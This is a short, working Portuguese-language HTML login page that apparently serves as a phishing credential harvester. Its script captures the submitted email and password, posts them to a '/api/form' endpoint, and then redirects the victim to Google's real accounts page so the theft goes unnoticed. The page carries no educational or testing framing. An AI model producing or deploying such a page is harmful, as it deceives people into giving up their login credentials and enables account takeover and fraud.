<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #111;
      padding: 30px 20px;
      border-radius: 8px;
      width: 100%;
      max-width: 300px;
      box-shadow: 0 0 8px rgba(255, 255, 255, 0.05);
    }

    .login-box h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 18px;
      color: #ccc;
    }

    input[type="email"],
    input[type="password"],
    button {
      width: 100%;
      height: 40px;
      font-size: 14px;
      margin: 10px 0;
      border-radius: 4px;
      box-sizing: border-box;
    }

    input[type="email"],
    input[type="password"] {
      border: 1px solid #444;
      background: #222;
      color: #fff;
      padding: 0 10px;
    }

    input::placeholder {
      color: #888;
      font-size: 13px;
    }

    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #0d59c4;
    }
  </style>
</head>
<body>

<div class="login-box">
  <h2>Entrar</h2>
  <form id="loginForm">
    <input type="email" name="email" placeholder="Seu email" required>
    <input type="password" name="senha" placeholder="Sua senha" required>
    <button type="submit">Entrar</button>
  </form>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const email = e.target.email.value;
    const senha = e.target.senha.value;

    await fetch("/api/form", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, senha })
    });

    window.location.href = "https://accounts.google.com/";
  });
</script>

</body>
</html>
